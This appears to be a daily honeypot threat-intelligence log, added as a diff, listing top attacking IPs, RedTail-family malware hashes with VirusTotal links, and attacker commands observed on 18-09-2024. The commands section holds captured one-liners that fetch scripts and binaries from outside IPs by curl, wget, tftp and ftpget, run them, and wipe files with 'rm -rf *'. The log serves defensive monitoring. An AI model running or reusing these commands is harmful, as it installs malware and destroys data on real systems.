@@ -1,0 +1,48 @@
+Top 5 IPs for 18-09-2024 :
+
+111.67.199.21
+120.194.62.119
+221.158.255.177
+44.220.133.51
+143.198.97.174
+
+
+Malware Observed:
+
+File Name : clean.sh
+d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e
+https://www.virustotal.com/gui/file/d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e
+
+
+File Name : redtail.arm7
+e86081329173be1acc1486a47cee17c9c7b78c50928e7bb9e05a86f1c040a746
+https://www.virustotal.com/gui/file/e86081329173be1acc1486a47cee17c9c7b78c50928e7bb9e05a86f1c040a746
+
+
+File Name : redtail.arm8
+88a339d0932322a43a5101d7afad05fa3bbcdbabe62cd5e287daa077398fef97
+https://www.virustotal.com/gui/file/88a339d0932322a43a5101d7afad05fa3bbcdbabe62cd5e287daa077398fef97
+
+
+File Name : redtail.i686
+42efa318e298e6069af565b5d09f30d38fc15d7ab1f1361addc9288e5a4e4d98
+https://www.virustotal.com/gui/file/42efa318e298e6069af565b5d09f30d38fc15d7ab1f1361addc9288e5a4e4d98
+
+
+File Name : redtail.x86_64
+eb3032f0ece8e5b1e77842283868b6ce8e003c92ca84f4123e71094b4b9aa18d
+https://www.virustotal.com/gui/file/eb3032f0ece8e5b1e77842283868b6ce8e003c92ca84f4123e71094b4b9aa18d
+
+
+Commands/exploits observed :
+
+
+X=$(curl http://154.216.18.19/sh || wget http://154.216.18.19/sh -O-); echo "$X" | sh -s apache.selfrep
+
+
+cd /data/local/tmp/; rm -rf *; busybox wget http://45.202.35.94/arm4; chmod 777 arm4; ./arm4 android; busybox wget http://45.202.35.94/arm5; chmod 777 arm5; ./arm5 android; busybox wget http://45.202.35.94/arm6; chmod 777 arm6; ./arm6 android; busybox wget http://45.202.35.94/arm7; chmod 777 arm7; ./arm7 android;
+
+
+(cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.161.34.97/ohshit.sh; curl -O http://103.161.34.97/ohshit.sh; chmod 777 ohshit.sh; sh ohshit.sh; tftp 103.161.34.97 -c get ohshit.sh; chmod 777 ohshit.sh; sh ohshit.sh; tftp -r ohshit2.sh -g 103.161.34.97; chmod 777 ohshit2.sh; sh ohshit2.sh; ftpget -v -u anonymous -p anonymous -P 21 103.161.34.97 ohshit1.sh ohshit1.sh; sh ohshit1.sh; rm -rf ohshit.sh ohshit.sh ohshit2.sh ohshit1.sh; rm -rf *; wget http://103.161.34.97/s.sh; chmod 777 *; sh s.sh; bash s.sh; ./s.sh; wget http://103.161.34.97/ohshit.sh; chmod 777 *; sh ohshit.sh; bash ohshit.sh; ./ohshit.sh;h)
+
+echo Content-Type: text/plain; echo; (cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.161.34.97/ohshit.sh; curl -O http://103.161.34.97/ohshit.sh; chmod 777 ohshit.sh; sh ohshit.sh; tftp 103.161.34.97 -c get ohshit.sh; chmod 777 ohshit.sh; sh ohshit.sh; tftp -r ohshit2.sh -g 103.161.34.97; chmod 777 ohshit2.sh; sh ohshit2.sh; ftpget -v -u anonymous -p anonymous -P 21 103.161.34.97 ohshit1.sh ohshit1.sh; sh ohshit1.sh; rm -rf ohshit.sh ohshit.sh ohshit2.sh ohshit1.sh; rm -rf *; wget http://103.161.34.97/s.sh; chmod 777 *; sh s.sh; bash s.sh; ./s.sh; wget http://103.161.34.97/ohshit.sh; chmod 777 *; sh ohshit.sh; bash ohshit.sh; ./ohshit.sh;h)
